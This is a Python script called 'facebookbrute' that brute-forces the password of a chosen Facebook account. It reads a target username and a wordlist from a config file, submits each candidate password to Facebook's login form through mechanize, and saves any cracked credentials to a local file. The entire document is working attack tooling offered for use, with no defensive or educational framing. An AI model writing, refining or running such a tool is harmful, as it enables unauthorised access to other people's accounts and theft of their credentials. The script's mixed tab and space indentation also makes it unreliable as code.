#!/usr/bin/python
# Title: facebookbrute
# Author: Th3J0k3r
#
import mechanize
import time
import os
import ConfigParser
from pathlib import Path
from multiprocessing import Process
from bs4 import BeautifulSoup
from lazyme.string import color_print


def def_banner():

	os.system('clear')
	color_print(" ______             _                 _    ____             _", color='red')       
 	color_print("|  ____|           | |               | |  |  _ \           | |",color='red')  
 	color_print("| |__ __ _  ___ ___| |__   ___   ___ | | _| |_) |_ __ _   _| |_ ___", color='red')
	color_print("|  __/ _` |/ __/ _ | '_ \ / _ \ / _ \| |/ |  _ <| '__| | | | __/ _ \ ", color='red')
 	color_print("| | | (_| | (_|  __| |_) | (_) | (_) |   <| |_) | |  | |_| | ||  __/ ", color='red')
 	color_print("|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_|____/|_|   \__,_|\__\___| ", color='red')
                                                                     


	color_print("			Created By Th3J0k3r", color='red')

# Read in the config file.
def def_config ():
	
	# Read in the config file
	global configParser
	configParser = ConfigParser.RawConfigParser()	
	configParser.read('config')

	global passwords
	global dic_path
	dic_path = configParser.get('Config','dict')
	username = configParser.get('Config', 'user')
	if (Path(dic_path).is_file() == False):
		color_print("\n\n[!] The wordlist does not extist", color='red')
		return 1
	if username == 'username' and dic_path == 'wordlist':
		color_print("\n\n[!] You need to setup the config file", color='red')
		return 1

	else:
		def_parrell(def_login)

def def_parrell(f):
	p = Process(target=f)
	p.start()

# Crack the password.
def def_login():


	global  browser
	browser = mechanize.Browser()
	browser.set_handle_robots(False)
	cookies = mechanize.CookieJar()
	browser.set_cookiejar(cookies)
	browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
	browser.set_handle_refresh(False)

	url = 'http://www.facebook.com/login.php'
	browser.open(url)
	browser.select_form(nr = 0)
	

	global request
	# read in the username from the config file.
	browser.form['email'] = configParser.get('Config', 'user')
	
	with open(dic_path) as fp:
		line = fp.readline()
	   	while line:

			password = format(line.strip())
	      		color_print("\n[*] Trying password {}".format(line.strip()), color='yellow')
			browser.form['pass'] = str(password)
			request = browser.submit()
			browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
			# Declare a BeautifulSoup Object.
			soup = BeautifulSoup(request, 'html.parser')

			# Attempt to brute force the password.
			try:

				action = soup.find('form', id='login_form').get('action')
				color_print(action, color='red')
				print("[!] Wrong password")
				browser.select_form(nr = 0)
	       			line = fp.readline()
				continue	
			except AttributeError:

				# Password found, Yey!!
				username = configParser.get('Config', 'user')	
				color_print("Password Cracked - Username: " + username + " Password: " + password, color='green')
				color_print("[!] Saving credentials to passwords/" + username, color='blue')	
				saveCreds = open('passwords/' + username + ".txt", 'w')
				saveCreds.write(username + '\n')
				saveCreds.write(password)
				saveCreds.close()
				break

			browser.select_form(nr = 0)
	       		line = fp.readline()
		time.sleep(0.0001)
	time.sleep(0.0001)

# call the methods.
def_banner()
def_config()
